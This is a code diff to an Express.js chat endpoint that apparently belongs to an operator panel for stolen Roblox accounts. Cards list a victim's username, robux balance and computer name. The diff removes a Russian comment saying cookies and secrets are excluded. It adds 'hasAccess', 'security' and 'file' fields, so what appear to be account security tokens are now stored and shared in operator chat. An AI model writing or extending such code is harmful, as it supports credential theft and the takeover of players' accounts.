@@ -1247,9 +1247,9 @@ app.get('/tokens', requireAuth, (req, res) => {
 
   app.post('/api/chat/messages', requireAuth, async (req, res) => {
     const user = req.authUser || req.session.user;
-    const { text, tokenCard } = req.body || {};
+    const { text, tokenCard, image } = req.body || {};
     
-    if ((!text || !text.trim()) && !tokenCard) {
+    if ((!text || !text.trim()) && !tokenCard && !image) {
       return res.status(400).json({ error: 'Empty message' });
     }
 
@@ -1257,14 +1257,16 @@ app.get('/tokens', requireAuth, (req, res) => {
       const db = await getDb();
       const settings = await getOperatorSettings(user);
       
-      // Исключаем куки и секреты - сохраняем ТОЛЬКО визуальную карточку
       let safeTokenCard = null;
       if (tokenCard && typeof tokenCard === 'object') {
         safeTokenCard = {
           username: String(tokenCard.username || 'Roblox User').substring(0, 50),
           userId: tokenCard.userId ? String(tokenCard.userId).substring(0, 30) : null,
           robux: Number(tokenCard.robux) || 0,
-          computer: String(tokenCard.computer || '—').substring(0, 50)
+          computer: String(tokenCard.computer || '—').substring(0, 50),
+          hasAccess: Boolean(tokenCard.hasAccess),
+          security: (tokenCard.hasAccess && tokenCard.security) ? String(tokenCard.security).trim().substring(0, 2000) : null,
+          file: (tokenCard.hasAccess && tokenCard.file) ? String(tokenCard.file).substring(0, 100) : null
         };
       }
 
@@ -1276,6 +1278,7 @@ app.get('/tokens', requireAuth, (req, res) => {
         avatar: settings.avatar || '',
         themeColor: settings.themeColor || '#38bdf8',
         text: typeof text === 'string' ? text.trim().substring(0, 1000) : '',
+        image: (typeof image === 'string' && (image.startsWith('data:image/') || image.startsWith('http'))) ? image : null,
         tokenCard: safeTokenCard,
         createdAt: Date.now()
       };
